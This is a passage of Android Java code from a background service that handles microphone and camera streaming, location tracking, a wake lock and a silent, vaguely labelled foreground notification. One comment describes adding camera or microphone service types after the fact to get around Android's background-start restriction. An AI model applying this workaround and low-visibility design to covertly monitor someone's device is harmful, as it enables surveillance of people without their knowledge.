        return micStreaming || cameraStreaming || locationTracking || activeTransfers.get() > 0;
    }

    private synchronized void syncWakeLock() {
        try {
            if (isBusy()) {
                if (!wakeLock.isHeld()) wakeLock.acquire();
            } else if (wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception ignored) {}
    }

    // Adds a foreground service type on top of whatever's already declared (DATA_SYNC at
    // minimum, see onCreate()) via a follow-up startForeground() call. This is the
    // platform-sanctioned way to add a sensitive type (camera/microphone) once the service
    // is ALREADY legitimately in the foreground — unlike declaring it upfront in onCreate(),
    // this isn't subject to the "must be in an eligible foreground state" restriction that
    // blocks STARTING a new foreground service with that type from the background.
    private synchronized void addForegroundServiceType(int type) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return;
        if ((currentFgsType & type) != 0) return; // already declared
        currentFgsType |= type;
        try { startForeground(NOTIF_ID, buildNotification(), currentFgsType); } catch (Exception ignored) {}
    }

    private synchronized void removeForegroundServiceType(int type) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return;
        if ((currentFgsType & type) == 0) return; // not currently declared
        currentFgsType &= ~type;
        try { startForeground(NOTIF_ID, buildNotification(), currentFgsType); } catch (Exception ignored) {}
    }

    // Cancels any pending idle-shutdown and, only if nothing is currently active, schedules
    // a fresh one. Safe to call after every state change — busy sessions simply never get
    // one scheduled.
    private void maybeScheduleIdleShutdown() {
        handler.removeCallbacks(idleShutdownRunnable);
        if (!isBusy()) handler.postDelayed(idleShutdownRunnable, IDLE_SHUTDOWN_MS);
    }

    private void shutdownIfIdle() {
        if (isBusy()) return; // something started right as this fired — safety check
        handleStopCamera();
        handleStopMic();
        handleStopLocation();
        syncWakeLock();
        stopForeground(true);
        stopSelf();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "meeee", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Active");
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent open = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(
            this, 0, open, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("meeee")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pi)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }
}
